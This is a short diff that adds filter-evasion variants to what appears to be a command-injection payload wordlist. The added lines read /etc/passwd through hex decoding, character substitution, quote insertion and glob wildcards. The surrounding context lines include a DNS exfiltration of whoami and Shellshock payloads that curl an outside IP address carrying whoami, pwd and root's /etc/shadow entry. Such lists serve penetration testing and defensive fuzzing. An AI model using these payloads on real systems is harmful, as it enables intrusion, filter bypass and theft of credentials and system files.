@@ -85,6 +85,17 @@ x&&ping+-c+10+127.0.0.1||
 `id`
 ||nslookup+`whoami`.localhost.com||
 $;/usr/bin/id
+cat ${HOME:0:1}etc${HOME:0:1}passwd
+cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
+cat $(echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64")
+cat $(xxd -r -p <<< 2f6574632f706173737764)
+cat $(xxd -r -ps <(echo 2f6574632f706173737764))
+c'a't /etc/passwd
+c"a"t /etc/passwd
+c\a\t /etc/passwd
+ca$@t /etc/passwd
+/???/c?t /etc/passwd
+/???/c?t /?tc/?as?wd
 () { :;}; /bin/bash -c "curl http://135.23.158.130/.testing/shellshock.txt?vuln=16?user=\`whoami\`"
 () { :;}; /bin/bash -c "curl http://135.23.158.130/.testing/shellshock.txt?vuln=18?pwd=\`pwd\`"
 () { :;}; /bin/bash -c "curl http://135.23.158.130/.testing/shellshock.txt?vuln=20?shadow=\`grep root /etc/shadow\`"
